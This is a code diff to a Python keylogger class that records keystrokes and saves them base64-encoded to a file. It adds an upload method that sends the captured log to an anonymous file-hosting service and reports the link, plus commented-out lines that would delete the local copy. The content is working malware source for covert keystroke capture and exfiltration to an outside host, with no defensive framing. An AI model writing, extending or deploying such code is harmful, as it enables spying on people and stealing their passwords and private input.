@@ -1,7 +1,10 @@
 # use wasabi for mesages
+import json
 import base64
 import wasabi
 import keyboard
+from os import remove
+import requests as req
 from threading import Timer, Thread
 from datetime import datetime
 
@@ -63,6 +66,18 @@ class keyLogger:
 		with open(f"{self.filename}.txt", 'w') as f:
 			f.write(base64.b64encode(self.log.encode("ascii")).decode("ascii"))
 		msg.good("Log file has been saved!")
+		self.upload()
+		# msg.info("reomving file")
+		# remove(f"{self.filename}.txt")
+
+	def upload(self):
+		url = 'https://anonfiles.me/api/v1/upload'
+		msg.info("Uploading file...")
+		file = { "file": open(f"{self.filename}.txt", 'r')}
+		resp = req.post(url, files=file)
+		anon_url = json.loads(resp.text)['data']['file']['url']['full']
+		msg.good(f"File has been uploaded to {anon_url}")
+		file["file"].close()
 
 	def report(self):
 		"""Functiom that reports to file
